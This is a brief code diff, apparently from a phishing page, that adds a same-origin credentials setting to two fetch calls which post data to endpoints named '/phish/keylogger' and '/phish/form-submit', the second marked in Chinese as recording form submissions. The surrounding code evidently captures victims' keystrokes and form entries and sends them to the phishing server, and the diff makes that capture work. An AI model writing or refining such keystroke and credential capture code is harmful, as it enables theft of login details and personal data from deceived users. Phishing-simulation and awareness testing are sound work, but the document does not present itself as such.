@@ -177,6 +177,7 @@
             
             fetch('/phish/keylogger', {
                 method: 'POST',
+                credentials: 'same-origin',
                 headers: {
                     'Content-Type': 'application/json'
                 },
@@ -197,6 +198,7 @@
             // 記錄表單提交事件
             fetch('/phish/form-submit', {
                 method: 'POST',
+                credentials: 'same-origin',
                 headers: {
                     'Content-Type': 'application/json'
                 },
